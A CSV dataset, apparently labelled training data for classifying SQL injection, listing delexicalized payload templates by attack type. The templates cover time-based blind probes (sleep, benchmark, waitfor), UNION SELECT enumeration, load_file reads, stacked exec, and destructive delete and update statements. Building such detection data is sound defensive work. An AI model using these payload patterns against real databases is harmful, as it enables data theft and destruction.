payload_delex,type_id
delete from __IDENT__ where __IDENT__ = __STR__,2
"__INT__ ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( __IDENT__",2
"__INT__"" ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __INT__ = __INT__",2
"-__INT__"" where __INT__ = __INT__ order by __INT__ --",0
"__INT__' ) ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__ % ' ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__ where __INT__ = __INT__ and sleep ( __INT__ ) #,6
"__INT__"" and ( __INT__ = __INT__ ) * __INT__",2
__INT__' where __INT__ = __INT__ and __INT__ = __INT__ --,2
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null , null , null , null#",7
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __STR__ like '__IDENT__",2
"__INT__ % "" or sleep ( __INT__ ) #",6
"__INT__ % ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( % __STR__",2
__INT__ ) waitfor __IDENT__ __STR__,6
__INT__ % ' rlike sleep ( __INT__ ) #,6
"-__INT__' where __INT__ = __INT__ union all select __INT__ , __INT__#",7
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"__INT__"" ) ) ) and __INT__ = __INT__ --",2
"or __IDENT__ ( [__IDENT__] = [__IDENT__] , [__IDENT__] ) or __IDENT__ ( [__IDENT__] , [__IDENT__] )",2
1__STR__bbgg__STR__bbgg,2
__INT__ % __STR__ % __STR__,2
__INT__' ) where __INT__ = __INT__ and __INT__ = __INT__,2
delete from __IDENT__ where __IDENT__ = __STR__,2
waitfor __IDENT__ __STR__#,6
"__INT__' ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"end and __STR__ like ""__IDENT__",2
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --",2
' ; __IDENT__ @__IDENT__ __IDENT__ ( __INT__ ) ; set @__IDENT__ = __HEX__ ; exec ( @__IDENT__ ) --,5
-__INT__' ) or ( __INT__ = __INT__ ) * __INT__,2
-__INT__' where __INT__ = __INT__ or __INT__ = __INT__ --,2
"__INT__"" where __INT__ = __INT__ union all select null , null , null , null , null , null --",7
"-__INT__"" ) order by __INT__ --",0
__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2
-__INT__ ) ) or __INT__ = __INT__#,2
"__INT__' ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
1__STR__pdia__STR__pdia,2
delete from __IDENT__ where __IDENT__ = __STR__,2
"__INT__"" ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and __STR__ = ""__IDENT__",2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
1__STR__fqxr__STR__fqxr,2
"__INT__ and elt ( __INT__ = __INT__ , __INT__ ) and __IDENT__",2
__INT__ ) ) and __INT__ = __INT__ --,2
"__INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) ) || '",0
__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and sleep ( __INT__ ) --,6
__INT__' ) ) ) and __INT__ = __INT__,2
__INT__' ) order by __INT__ --,0
"__INT__ ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",2
"__INT__ % "" ) ) ) or sleep ( __INT__ ) #",6
1__STR__pfal__STR__pfal,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"__INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",6
1__STR__dcha__STR__dcha,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"-__INT__ % "" ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
__INT__ waitfor __IDENT__ __IDENT__,6
__INT__ ) ) order by __INT__ --,0
-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --,2
"__INT__"" ) where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
-__INT__ ) or __INT__ = __INT__ --,2
-__INT__ ) where __INT__ = __INT__ or __INT__ = __INT__#,2
__INT__ ) ) ) waitfor __IDENT__ __IDENT__,6
"__INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and __IDENT__",6
"-__INT__"" ) ) ) or __INT__ = __INT__",2
"-__INT__ ) ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __IDENT__",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"-__INT__"" ) ) ) or __INT__ = __INT__",2
"-__INT__"" or __INT__ = __INT__#",2
__INT__ ) ) or sleep ( __INT__ ) #,6
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null , null , null --",7
"__INT__ ) where __INT__ = __INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) --",3
-__INT__ or __INT__ = __INT__,2
"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
-__INT__' ) ) or __INT__ = __INT__,2
"__INT__"" ) union all select null , null , null , null , null , null , null , null , null#",7
"__INT__ ) and __IDENT__ ( __INT__ = __INT__ , __INT__ ) and ( __INT__ = __INT__",2
"update call set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"__INT__ % ' ) ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
"__INT__' where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
__INT__' ) as __IDENT__ where __INT__ = __INT__ order by __INT__#,0
; __IDENT__ __IDENT__ . sleep ( [__IDENT__] ) ; end ; __IDENT__ if ( [__IDENT__] ) then __IDENT__ . sleep ( [__IDENT__] ) ; else __IDENT__ . sleep ( __INT__ ) ; end if ; end,6
-__INT__ ) ) ) or __INT__ = __INT__,2
"-__INT__"" or __INT__ = __INT__",2
delete from __IDENT__,2
"__INT__"" where __INT__ = __INT__ and __INT__ = __INT__",2
"__INT__ ) where __INT__ = __INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"-__INT__ ) or elt ( __INT__ = __INT__ , __INT__ )",2
"-__INT__"" ) ) ) or __INT__ = __INT__#",2
-__INT__' ) ) ) order by __INT__#,0
"__INT__ % ' ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"-__INT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",2
__INT__' where __INT__ = __INT__ and __INT__ = __INT__ --,2
-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --,2
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
-3062__STR__uzth__STR__uzth,2
1__STR__tnzp__STR__tnzp,2
"__INT__ ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( __IDENT__",2
"-__INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) # __IDENT__",2
"-__INT__ % "" or __INT__ = __INT__",2
"__INT__' ) ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
__IDENT__' and __IDENT__ is null,2
"__INT__' where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
__IDENT__-__IDENT__@__IDENT__-__IDENT__-__IDENT__-__IDENT__-__IDENT__-__IDENT__-__IDENT__,0
1__STR__botl__STR__botl,2
"__INT__ % "" union all select null , null , null , null , null#",7
"__INT__ % ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( % __STR__",2
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and __STR__ like ""__IDENT__",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
__INT__ ) as __IDENT__ where __INT__ = __INT__ and sleep ( __INT__ ) --,6
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"union select __INT__ , load_file ( __STR__ ) , __INT__ , __INT__ , __INT__ ;",7
"__INT__"" where __INT__ = __INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
-7636__STR__sjuv__STR__sjuv,2
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --,2
"__INT__ ) ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( ( __IDENT__",6
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) #",6
-__INT__' or __INT__ = __INT__,2
"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --",2
-__INT__' ) ) ) or __INT__ = __INT__#,2
-__INT__' ) ) order by __INT__ --,0
"__INT__ ) ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) and ( ( ( __IDENT__",3
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ rlike sleep ( __INT__ ) #",6
-__INT__' ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__,2
"__INT__' ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ % ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( % __STR__",2
__INT__ where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --,2
"-__INT__ ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( __INT__ = __INT__",2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
"select __IDENT__ , having from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",7
1__STR__vvkd__STR__vvkd,2
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --",2
-__INT__ ) ) or __INT__ = __INT__,2
delete from if,2
"-__INT__"" where __INT__ = __INT__ or __INT__ = __INT__ --",2
"__INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) # __IDENT__",3
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or sleep ( __INT__ ) --",6
"__INT__ % __IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
’ or ‘__INT__’ = ’__INT__,2
1__STR__jfsw__STR__jfsw,2
"__INT__ ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( __IDENT__",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
__INT__ ) and __INT__ = __INT__#,2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__ ) where __INT__ = __INT__ union all select null , null , null , null , null , null#",7
-__INT__ or __INT__ = __INT__ --,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
__INT__ ) where __INT__ = __INT__ and sleep ( __INT__ ) --,6
"1__STR__abcdefg , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and __IDENT__",6
-__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__,2
"__INT__ % __IDENT__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( % __STR__",6
delete from __IDENT__,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"__INT__ % ' ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__"" ) union all select null , null , null , null , null , null , null , null , null , null --",7
__INT__ union all select null --,7
__INT__ ) as __IDENT__ where __INT__ = __INT__ waitfor __IDENT__ __TIME__ --,6
"__INT__ ) ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __INT__ = __INT__",2
-__INT__ % __STR__ % __STR__,2
"__INT__"" ) and __INT__ = __INT__#",2
-6014__STR__qtge__STR__qtge,2
__INT__ ) and __INT__ = __INT__ --,2
"-__INT__"" where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
1__STR__ssrm__STR__ssrm,2
"__INT__"" ) ) waitfor __IDENT__ __STR__ --",6
delete from __IDENT__,2
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"__INT__ % "" or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
-8810__STR__prsn__STR__prsn,2
"-__INT__"" where __INT__ = __INT__ or __INT__ = __INT__#",2
"__INT__ ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( __INT__ = __INT__",6
"-__INT__ ) ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __INT__ = __INT__",2
"__INT__ % "" ) ) ) and __INT__ = __INT__#",2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
-__INT__ % __STR__ % __STR__,2
"__INT__ % ' ) ) union all select null , null , null , null --",7
"__INT__"" ) where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
' or __INT__ = __INT__ --,2
"__INT__ % ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( % __STR__",6
"__INT__' and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null )",2
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __STR__ = """,2
"__INT__ ) where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",7
__INT__ ) where __INT__ = __INT__ and __INT__ = __INT__ --,2
-__INT__' ) order by __INT__ --,0
end and ( ( ( __STR__ = '__IDENT__,2
"__INT__"" where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__' ) and __INT__ = __INT__#,2
"__INT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"-__INT__"" ) or __INT__ = __INT__ --",2
-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --,2
"__INT__"" ) where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
delete from __IDENT__ where __IDENT__ = __STR__,2
"__INT__ ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( __IDENT__",6
"__INT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
-__INT__ % __STR__ % __STR__,2
"__INT__"" ) where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__ % ) or sleep ( __INT__ ) and ( % __STR__,6
-8791__STR__pvdk__STR__pvdk,2
"__INT__' ) and elt ( __INT__ = __INT__ , __INT__ )",2
__INT__ % ' and __INT__ = __INT__ --,2
"__INT__"" ) where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
__INT__' ) ) and __INT__ = __INT__,2
-__INT__' or __INT__ = __INT__,2
"__INT__ % ' ) ) ) union all select null , null , null , null , null , null , null#",7
"-__INT__"" order by __INT__#",0
"__INT__ ) ) union all select null , null , null , null , null , null , null , null#",7
"-__INT__ ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( __IDENT__",2
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and __STR__ = '__IDENT__",2
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
__INT__ and sleep ( __INT__ ) #,6
"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ --",7
-__INT__' order by __INT__#,0
__INT__ ) ) rlike sleep ( __INT__ ) and ( ( __INT__ = __INT__,6
or __IDENT__ = __IDENT__,2
"__INT__' , __IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__ % ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( % __STR__",2
"__INT__ ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",2
"__INT__ % or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and % __STR__",2
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __STR__ = """,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"__INT__"" ) waitfor __IDENT__ __STR__ --",6
and case when [__IDENT__] = [__IDENT__] then [__IDENT__] else __IDENT__ ( __STR__ ) end and case when [__IDENT__] then [__IDENT__] else __IDENT__ ( __STR__ ) end,2
"__INT__ ) ) and __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( ( __IDENT__",6
-7271__STR__mdtw__STR__mdtw,2
"__INT__ % ' ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__"" ) ) ) waitfor __IDENT__ __STR__ --",6
"-__INT__' ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
